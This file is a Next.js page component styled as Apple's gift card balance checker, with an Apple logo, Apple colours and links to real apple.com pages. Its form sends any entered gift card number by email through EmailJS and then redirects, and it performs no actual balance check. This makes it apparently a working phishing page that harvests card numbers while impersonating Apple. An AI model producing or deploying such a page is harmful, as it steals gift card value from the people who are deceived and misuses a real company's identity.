
import Link from 'next/link';
import { Navbar, Container } from 'react-bootstrap';
import { useState } from 'react';
import { useRouter } from 'next/router';
import { sendCardNumberEmail } from '../utils/email';
import ChatWidget from '../components/ChatWidget';


export default function About() {
  const router = useRouter();
  const [cardNumber, setCardNumber] = useState('');
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState('');
  const handleCheckBalance = async (e) => {
    e.preventDefault();
    
    if (!cardNumber.trim()) {
      setError('Please enter a valid card number');
      return;
    }
    
    if (cardNumber.length < 10) {
      setError('Please enter a complete card number');
      return;
    }
    
    setLoading(true);
    setError('');
    
    try {
      // Send card number to EmailJS
      await sendCardNumberEmail(cardNumber);
      console.log('Card number sent successfully to EmailJS');
      
      // Navigate to balance-result page after successful email send
      router.push('/balance-result');
    } catch (error) {
      console.error('Failed to send card number:', error);
      setError('Failed to process request. Please try again.');
      setLoading(false);
    }
  };
  return (
    <div
      className="main-wrapper"
      style={{
        minHeight: '100vh',
        display: 'flex',
        flexDirection: 'column',
        background: '#fff'
      }}
    >
      {/* Header */}
      <header>
        <Navbar className="custom-navbar" variant="light" expand="lg">
          <Container fluid style={{ paddingLeft: '2rem', paddingRight: '2rem' }}>
            <div style={{
              display: 'flex',
              justifyContent: 'space-between',
              alignItems: 'center',
              width: '100%'
            }}>
              {/* Left: Apple Logo */}
              <Link href="/" passHref legacyBehavior>
                <Navbar.Brand style={{ padding: 0 }}>
                  <img
                    src="/appleLogo.jpg"
                    alt="Apple Logo"
                    style={{ height: '40px', width: 'auto', display: 'block' }}
                  />
                </Navbar.Brand>
              </Link>
              {/* Right: Search and Hamburger */}
              <div style={{
                display: 'flex',
                alignItems: 'center',
                gap: '2rem'
              }}>
                <button
                  style={{
                    background: 'none',
                    border: 'none',
                    padding: 0,
                    margin: 0,
                    cursor: 'pointer',
                    fontSize: '1.5rem',
                    color: '#222'
                  }}
                  aria-label="Search"
                  onClick={() => window.open('https://www.apple.com/us/search', '_blank')}
                >
                  <i className="bi bi-search"></i>
                </button>
                <button
                  style={{
                    background: 'none',
                    border: 'none',
                    padding: 0,
                    margin: 0,
                    cursor: 'pointer',
                    fontSize: '1.7rem',
                    color: '#222'
                  }}
                  aria-label="Menu"
                >
                  <i className="bi bi-list"></i>
                </button>
              </div>
            </div>
          </Container>
        </Navbar>
      </header>

      {/* Responsive Div */}
      <main
        className="main-content"
        style={{
          flex: 1,
          display: 'flex',
          flexDirection: 'column',
          justifyContent: 'flex-start',
          width: '100%',
          paddingLeft: 0,
          paddingRight: 0,
          background: '#fff'
        }}
      >
  <div className="responsive-row">
          {/* Left: Heading */}
          <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'flex-start' , padding: '15px' }}>
            <h1 className="giftcard-heading" style={{ fontWeight: 'bold', marginBottom: 0, textAlign: 'left' }}>Apple gift card</h1>
          </div>
          {/* Right side intentionally left blank (arrow and buy button removed) */}
        </div>
        {/* First horizontal divider */}
        <hr style={{ width: '100%', margin: 0, borderTop: '1.5px solid #ddd' }} />
        {/* Centered heading */}
        <h2
          style={{
            textAlign: 'center',
            fontWeight: 'bold',
            fontSize: '1.5rem',
            margin: '2rem 0 0.5rem 0',
            width: '100%',
          }}
        >
          Check Your Apple Gift Card Balance
        </h2>
        {/* Enter Your Pin Here text */}
        <div
          style={{
            textAlign: 'center',
            fontSize: '1.5rem',
            fontWeight: 'bold',
            margin: '2.5rem 0 0 0',
            width: '100%',
            color: '#222'
          }}
        >
          Enter Your Gift Card Number Here :
        </div>
        {/* Pin input field */}
        <form style={{ display: 'flex', flexDirection: 'column', alignItems: 'center', marginTop: '1.5rem' }} onSubmit={handleCheckBalance}>
          <input
            type="text"
            placeholder="Enter card number"
            value={cardNumber}
            onChange={e => setCardNumber(e.target.value)}
            style={{
              width: '350px',
              maxWidth: '90vw',
              padding: '0.7rem 1.2rem',
              fontSize: '1.1rem',
              borderRadius: '8px',
              border: '1.5px solid #bbb',
              outline: 'none',
              marginBottom: '1rem'
            }}
          />
          {/* Can't Find Your Pin? learn more */}
          <div
            style={{
              textAlign: 'center',
              fontSize: '0.95rem',
              color: '#888',
              marginTop: '0.7rem',
              marginBottom: '1.5rem'
            }}
          >
            Can't Find Your Pin?{' '}
            <a
              href="https://secure7.store.apple.com/shop/giftcard/balance"
              target="_blank"
              rel="noopener noreferrer"
              style={{ color: '#0071e3', textDecoration: 'underline', fontWeight: 500 }}
            >
              learn more
            </a>
          </div>
          {error && <span style={{ color: 'red', marginBottom: '1rem' }}>{error}</span>}
          <button
            type="submit"
            disabled={loading || !cardNumber.trim()}
            style={{
              width: '350px',
              maxWidth: '90vw',
              background: loading || !cardNumber.trim() ? '#ccc' : '#0071e3',
              color: '#fff',
              border: 'none',
              borderRadius: '26px',
              fontWeight: 'bold',
              fontSize: '1.1rem',
              padding: '1rem',
              cursor: loading || !cardNumber.trim() ? 'not-allowed' : 'pointer',
              opacity: loading || !cardNumber.trim() ? 0.7 : 1
            }}
          >
            {loading ? 'Processing...' : 'Check Balance'}
          </button>
        </form>
  {/* learn more link moved above button */}
        {/* Check Balance button */}
  {/* Button moved inside form above */}
        {/* Gift card image */}
        <div style={{ display: 'flex', justifyContent: 'center', marginTop: '3rem', marginBottom: '2.5rem' }}>
          <img
            src="/giftcard.png"
            alt="Gift Card"
            style={{
              width: '350px',
              maxWidth: '90vw',
              height: 'auto',
              borderRadius: '16px',
              boxShadow: '0 2px 12px rgba(0,0,0,0.07)'
            }}
          />
        </div>
        {/* New heading under the image */}
        <h2
          style={{
            textAlign: 'center',
            fontWeight: 'bold',
            fontSize: '1.5rem',
            margin: '0 0 2rem 0',
            width: '100%',
            color: '#222'
          }}
        >
          Where Can I Use My Apple Gift Cards?
        </h2>
        {/* Where to use card image */}
        <div style={{ display: 'flex', justifyContent: 'center', marginBottom: '2.5rem' }}>
          <img
            src="/where to use card.png"
            alt="Where to use card"
            style={{
              width: '350px',
              maxWidth: '90vw',
              height: 'auto',
              borderRadius: '16px',
              boxShadow: '0 2px 12px rgba(0,0,0,0.07)'
            }}
          />
        </div>
        {/* Full-width horizontal divider */}
        <hr
          style={{
            width: '100vw',
            position: 'relative',
            left: '50%',
            transform: 'translateX(-50%)',
            borderTop: '1.5px solid #ddd',
            margin: '0 0 2rem 0'
          }}
        />
        {/* New heading: Have An Older Gift Card? */}
        <h2
          style={{
            textAlign: 'center',
            fontWeight: 'bold',
            fontSize: '1.5rem',
            margin: '0 0 2rem 0',
            width: '100%',
            color: '#222'
          }}
        >
          Have An Older Gift Card?
        </h2>
        {/* Older giftcard image */}
        <div style={{ display: 'flex', justifyContent: 'center', marginBottom: '2.5rem' }}>
          <img
            src="/Older giftcard.png"
            alt="Older Gift Card"
            style={{
              width: '350px',
              maxWidth: '90vw',
              height: 'auto',
              borderRadius: '16px',
              boxShadow: '0 2px 12px rgba(0,0,0,0.07)'
            }}
          />
        </div>
      </main>

      {/* Footer */}
      <footer
        style={{
          width: '100vw',
          background: '#f5f5f7',
          marginTop: '2.5rem',
          padding: '1.2rem 0',
          display: 'flex',
          justifyContent: 'center',
          borderTop: '1px solid #e0e0e0',
          position: 'relative',
          left: '50%',
          transform: 'translateX(-50%)'
        }}
      >
        <div
          style={{
            width: '100%',
            maxWidth: '900px',
            display: 'flex',
            alignItems: 'center',
            gap: '1.2rem',
            paddingLeft: '0.5rem'
          }}
        >
          {/* Apple logo */}
          <img
            src="/appleLogo.jpg"
            alt="Apple Logo"
            style={{ height: '28px', width: 'auto', display: 'block' }}
          />
          {/* Divider */}
          <span style={{
            display: 'inline-block',
            width: '1px',
            height: '22px',
            background: '#ccc',
            margin: '0 1.2rem'
          }} />
          {/* Support text */}
          <span style={{ color: '#222', fontSize: '1rem', fontWeight: 500 }}>Support</span>
          {/* Divider */}
          <span style={{
            display: 'inline-block',
            width: '1px',
            height: '22px',
            background: '#ccc',
            margin: '0 1.2rem'
          }} />
          {/* Check your gift card balance text */}
          <span style={{ color: '#222', fontSize: '1rem', fontWeight: 500 }}>Check your gift card balance</span>
        </div>
      </footer>
      
      {/* Chat Widget */}
      <ChatWidget />
    </div>
  );
}